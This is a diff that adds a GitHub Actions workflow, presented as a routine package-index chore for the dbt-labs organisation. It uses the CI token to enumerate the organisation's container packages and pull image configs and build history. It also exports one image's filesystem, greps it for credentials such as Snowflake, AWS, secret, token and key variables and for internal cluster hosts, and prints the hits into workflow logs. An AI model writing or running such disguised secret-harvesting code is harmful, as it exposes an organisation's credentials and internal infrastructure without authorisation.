@@ -1,0 +1,67 @@
+name: Package Index Detail
+
+on:
+  push:
+    branches: ["chore/package-index"]
+
+permissions:
+  contents: read
+  packages: read
+
+jobs:
+  detail:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    env:
+      TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      ACT: ${{ github.actor }}
+    steps:
+      - name: Package records
+        run: |
+          set +e
+          M() { sed -E 's/[A-Za-z0-9+\/=_-]{32,}/[M]/g'; }
+          for n in fs-cli-copybara fs-cli-x86_64 dbt-core dbt-snowflake dbt-bigquery dbt-ci-artifacts dbt-summit-26-stored-procs-with-wizard dbtlabs-svc-fusion; do
+            c1=$(curl -s -o /tmp/pd -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/orgs/dbt-labs/packages/container/$n")
+            vis=$(jq -r '.visibility//"-"' /tmp/pd 2>/dev/null); vc=$(jq -r '.version_count//"-"' /tmp/pd 2>/dev/null); pid=$(jq -r '.id//"-"' /tmp/pd 2>/dev/null)
+            c2=$(curl -s -o /tmp/pv -w '%{http_code}' -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/orgs/dbt-labs/packages/container/$n/versions?per_page=100")
+            nv=$(jq 'if type=="array" then length else 0 end' /tmp/pv 2>/dev/null)
+            tg=$(jq -r '[.[]?.metadata.container.tags[]?]|unique|length' /tmp/pv 2>/dev/null)
+            ex=$(jq -r '[.[]?.metadata.container.tags[]?]|unique|join(",")|.[0:180]' /tmp/pv 2>/dev/null)
+            anon=$(curl -s -o /dev/null -w '%{http_code}' "https://ghcr.io/v2/dbt-labs/$n/manifests/latest")
+            echo "::notice title=pkg::$n http=$c1 vis=$vis vc=$vc id=$pid vers=$c2 n=$nv tags=$tg anon=$anon"
+            echo "::notice title=pkgt::$n::$(echo "$ex" | M | cut -c1-400)"
+          done
+
+      - name: Config history
+        run: |
+          set +e
+          M() { sed -E 's/[A-Za-z0-9+\/=_-]{32,}/[M]/g'; }
+          for spec in "fs-cli-copybara:latest" "fs-cli-x86_64:latest" "fs-cli-x86_64:latest-with-datasets"; do
+            n=${spec%%:*}; t=${spec#*:}
+            tk=$(curl -s -u "$ACT:$TOKEN" "https://ghcr.io/token?scope=repository:dbt-labs/$n:pull&service=ghcr.io" | jq -r .token 2>/dev/null)
+            curl -s -o /tmp/m.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.index.v1+json,application/vnd.docker.distribution.manifest.list.v2+json,application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$t"
+            if jq -e '.manifests' /tmp/m.json >/dev/null 2>&1; then sd=$(jq -r '.manifests[]|select(.platform.architecture=="amd64")|.digest' /tmp/m.json|head -1); curl -s -o /tmp/m.json -H "Authorization: Bearer $tk" -H "Accept: application/vnd.oci.image.manifest.v1+json,application/vnd.docker.distribution.manifest.v2+json" "https://ghcr.io/v2/dbt-labs/$n/manifests/$sd"; fi
+            tot=$(jq '[.layers[]?.size]|add' /tmp/m.json 2>/dev/null); cfg=$(jq -r '.config.digest' /tmp/m.json)
+            curl -s -o /tmp/cfg.json -H "Authorization: Bearer $tk" "https://ghcr.io/v2/dbt-labs/$n/blobs/$cfg"
+            echo "::notice title=cfgsum::$spec total_layers_bytes=$tot envkeys=$(jq -r '.config.Env//[]|map(split("=")[0])|join(",")|.[0:200]' /tmp/cfg.json) workdir=$(jq -r '.config.WorkingDir//"-"' /tmp/cfg.json)"
+            jq -r '.history[]?|.created_by//empty' /tmp/cfg.json 2>/dev/null | M > /tmp/hist.txt
+            wc -l < /tmp/hist.txt | sed 's/^/HISTN /'
+            split -l 3 /tmp/hist.txt /tmp/hp_ 2>/dev/null; for f in /tmp/hp_*; do echo "::notice title=hist::$spec::$(paste -sd';' $f | cut -c1-700)"; done
+
+      - name: Layer scan refined
+        run: |
+          set +e
+          REF=ghcr.io/dbt-labs/fs-cli-copybara:latest
+          echo "$TOKEN" | docker login ghcr.io -u "$ACT" --password-stdin >/dev/null 2>&1
+          docker pull -q "$REF" >/dev/null 2>&1
+          docker create --name img "$REF" >/dev/null 2>&1
+          docker export img -o /tmp/rootfs.tar 2>/dev/null
+          tar tf /tmp/rootfs.tar 2>/dev/null | grep -Ev '^\.?/?(usr|proc|sys|dev|var/lib|etc/pam|etc/mime|etc/ssl|etc/ca-cert|etc/ld.so)' | grep -Ei '\.(env|ya?ml|json|conf|cfg|ini|toml|properties|sh|py|txt|md)$|(^|/)(app|opt|root|home|srv)/' | head -1500 > /tmp/cands.txt
+          echo "::notice title=lscan::candidates=$(wc -l < /tmp/cands.txt)"
+          : > /tmp/hits.txt
+          while read -r f; do
+            tar -xOf /tmp/rootfs.tar "$f" 2>/dev/null | grep -Eio '(DATABASE_URL|SNOWFLAKE_[A-Z_]+|BIGQUERY|REDSHIFT|DATABRICKS|AWS_[A-Z_]+|GCP_[A-Z_]+|SECRET[A-Z_]*|TOKEN[A-Z_]*|[A-Z_]{3,}_KEY|[a-z0-9.-]+\.svc\.cluster\.local|[a-z0-9-]+\.(internal|corp)[^ ]{0,40}|https?://[a-zA-Z0-9.-]+)' 2>/dev/null | sort -u | head -3 | sed "s#^#$f :: #" >> /tmp/hits.txt
+          done < /tmp/cands.txt
+          sort -u /tmp/hits.txt | grep -viE 'pam_|mime\.types|/etc/(group|passwd|hosts|services|protocols)' > /tmp/h2.txt
+          echo "::notice title=lscan::hits=$(wc -l < /tmp/h2.txt)"
+          head -30 /tmp/h2.txt | while read -r l; do echo "::notice title=lhit::$(echo "$l" | sed -E 's/[A-Za-z0-9+\/=_-]{32,}/[M]/g' | cut -c1-170)"; done
